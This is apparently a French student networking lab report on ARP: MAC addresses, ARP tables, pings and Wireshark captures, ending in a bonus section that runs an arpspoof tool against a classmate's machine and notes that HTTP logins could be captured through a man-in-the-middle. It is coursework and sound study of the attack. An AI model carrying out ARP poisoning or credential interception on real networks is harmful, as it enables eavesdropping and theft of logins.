# TP3 : 32°13'34"N 95°03'27"W

## Sommaire

- [TP3 : 32°13'34"N 95°03'27"W](#tp3--321334n-950327w)
  - [Sommaire](#sommaire)
- [I. ARP basics](#i-arp-basics)
- [II. ARP dans un réseau local](#ii-arp-dans-un-réseau-local)
  - [1. Basics](#1-basics)
  - [2. ARP](#2-arp)
  - [3. Bonus : ARP poisoning](#3-bonus--arp-poisoning)

# I. ARP basics

**☀️ Avant de continuer...**
- affichez l'adresse MAC de votre carte WiFi !

```powershell
PS C:\Users\souri> ipconfig /all

Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Description. . . . . . . . . . . . . . : Intel(R) Wi-Fi 6E AX211 160MHz
=> Adresse physique . . . . . . . . . . . : E4-0D-36-2F-88-9D 
   DHCP activé. . . . . . . . . . . . . . : Oui
   Configuration automatique activée. . . : Oui
   Adresse IPv4. . . . . . . . . . . . . .: 10.33.78.252(préféré)
   Masque de sous-réseau. . . . . . . . . : 255.255.240.0
   Passerelle par défaut. . . . . . . . . : 10.33.79.254
   Serveur DHCP . . . . . . . . . . . . . : 10.33.79.254
```

**☀️ Affichez votre table ARP**
```powershell
PS C:\Users\souri> arp -a

Interface?: 10.33.78.252 --- 0x9
  Adresse Internet      Adresse physique      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamique
  10.33.66.78           e4-b3-18-48-36-68     dynamique
  10.33.67.119          60-6e-e8-2a-8f-90     dynamique
  10.33.68.54           6e-91-40-e2-af-1d     dynamique
  10.33.73.77           98-8d-46-c4-fa-e5     dynamique
  10.33.77.160          c8-94-02-f8-ab-97     dynamique
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique
  10.33.79.255          ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique

Interface?: 192.168.56.1 --- 0x13
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
```

**☀️ Déterminez l'adresse MAC de la passerelle du réseau de l'école**

Il faut dabord trouver l'**IP**.
```powershell
PS C:\Users\souri> ipconfig /all

Carte réseau sans fil Wi-Fi :
[..]
   Passerelle par défaut. . . . . . . . . : 10.33.79.254
[..]
```

Puis on peut utiliser la table **ARP** pour retrouver son adresse **MAC**

```powershell
PS C:\Users\souri> arp -a | Select-String 10.33.79.254

  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique
```

**☀️ Supprimez la ligne qui concerne la passerelle**

```powershell
PS C:\Windows\system32> arp -d 10.33.79.254
```

**☀️ Prouvez que vous avez supprimé la ligne dans la table ARP**

```powershell
PS C:\Windows\system32> arp -a

Interface?: 10.33.78.252 --- 0x9
  Adresse Internet      Adresse physique      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamique
  10.33.66.78           e4-b3-18-48-36-68     dynamique
  10.33.67.119          60-6e-e8-2a-8f-90     dynamique
  10.33.68.54           6e-91-40-e2-af-1d     dynamique
  10.33.73.77           98-8d-46-c4-fa-e5     dynamique
  10.33.77.160          c8-94-02-f8-ab-97     dynamique
  10.33.79.255          ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique
```

**☀️ Wireshark**

[Fichier arp1.pcap](arp1.pcap)

# II. ARP dans un réseau local
## 1. Basics

**☀️ Déterminer**
- son adresse IP au sein du réseau local formé par le partage de co
- son adresse MAC

```powershell
C:\Windows\system32> ipconfig /all

Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Description. . . . . . . . . . . . . . : Intel(R) Wi-Fi 6E AX211 160MHz
=> Adresse physique . . . . . . . . . . . : E4-0D-36-2F-88-9D
   DHCP activé. . . . . . . . . . . . . . : Oui
   Configuration automatique activée. . . : Oui
=> Adresse IPv4. . . . . . . . . . . . . .: 172.20.10.7(préféré)
   Masque de sous-réseau. . . . . . . . . : 255.255.255.240
   Passerelle par défaut. . . . . . . . . : 172.20.10.1
   Serveur DHCP . . . . . . . . . . . . . : 172.20.10.1

```

**☀️ DIY**

```powershell
C:\Windows\system32> ipconfig /all

Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Description. . . . . . . . . . . . . . : Intel(R) Wi-Fi 6E AX211 160MHz
   Adresse physique . . . . . . . . . . . : E4-0D-36-2F-88-9D
   DHCP activé. . . . . . . . . . . . . . : Non
   Configuration automatique activée. . . : Oui
   Adresse IPv4. . . . . . . . . . . . . .: 172.20.10.11(préféré)
   Masque de sous-réseau. . . . . . . . . : 255.255.255.240
   Passerelle par défaut. . . . . . . . . : 172.20.10.1
   ```

**☀️ Pingz !**
- vérifiez que vous pouvez tous vous ping avec ces adresses IP

```powershell
PS C:\Windows\system32> ping 172.20.10.12

Envoi d’une requête 'Ping'  172.20.10.12 avec 32 octets de données :
Réponse de 172.20.10.12 : octets=32 temps=119 ms TTL=64
Réponse de 172.20.10.12 : octets=32 temps=247 ms TTL=64
Statistiques Ping pour 172.20.10.12:
    Paquets : envoyés = 2, reçus = 2, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 71ms, Maximum = 247ms, Moyenne = 139ms

PS C:\Windows\system32> ping 172.20.10.9

Envoi d’une requête 'Ping'  172.20.10.9 avec 32 octets de données :
Réponse de 172.20.10.9 : octets=32 temps=5 ms TTL=128
Réponse de 172.20.10.9 : octets=32 temps=21 ms TTL=128

Statistiques Ping pour 172.20.10.9:
    Paquets : envoyés = 2, reçus = 2, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 5ms, Maximum = 21ms, Moyenne = 13ms
```

- vérifiez avec une commande ping que vous avez bien un accès internet
```powershell
PS C:\Windows\system32> ping youtube.com

Envoi d’une requête 'ping' sur youtube.com [142.251.220.206] avec 32 octets de données :
Réponse de 142.251.220.206 : octets=32 temps=64 ms TTL=59
Réponse de 142.251.220.206 : octets=32 temps=72 ms TTL=59

Statistiques Ping pour 142.251.220.206:
    Paquets : envoyés = 2, reçus = 2, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 64ms, Maximum = 72ms, Moyenne = 68ms
```


## 2. ARP

**☀️ Affichez votre table ARP !**

 ```powershell
 PS C:\Windows\system32> arp -a

Interface?: 172.20.10.11 --- 0x9
  Adresse Internet      Adresse physique      Type
  172.20.10.1           8a-1e-5a-a3-4b-64     dynamique
  172.20.10.7           50-a6-d8-9b-0b-a7     dynamique
  172.20.10.8           50-a6-d8-9b-0b-a7     dynamique
  172.20.10.9           a8-6d-aa-e7-87-40     dynamique
  172.20.10.12          50-a6-d8-9b-0b-a7     dynamique
  172.20.10.15          ff-ff-ff-ff-ff-ff     statique
```

**☀️ Capture arp2.pcap**

[Fichier arp2.pcap](arp2.pcap)

## 3. Bonus : ARP poisoning

**⭐ Empoisonner la table ARP de l'un des membres de votre réseau**

En ayant utilisé: https://github.com/alandau/arpspoof

```powershell
PS C:\Users\souri\Downloads> .\arpspoof.exe 172.20.10.9
Resolving victim and target...
Redirecting 172.20.10.9 (a8:6d:aa:e7:87:40) ---> 172.20.10.1 (8a:1e:5a:a3:4b:64)
        and in the other direction
```

Sur le pc de la victime:

```powershell
PS C:\WINDOWS\system32> arp -a
Interface : 172.20.10.9 --- 0xe
  Adresse Internet      Adresse physique      Type
  172.20.10.11          e4-0d-36-2f-88-9d     dynamique 
```


**⭐ Mettre en place un MITM**

On peut donc intercepter les données de login a un site (ex: https://github.com/alandau/arpspoof) avec **Wireshark** si le site est en HTTP

[Capture Wireshark des packets HTTP](arppoisoning.pcap)
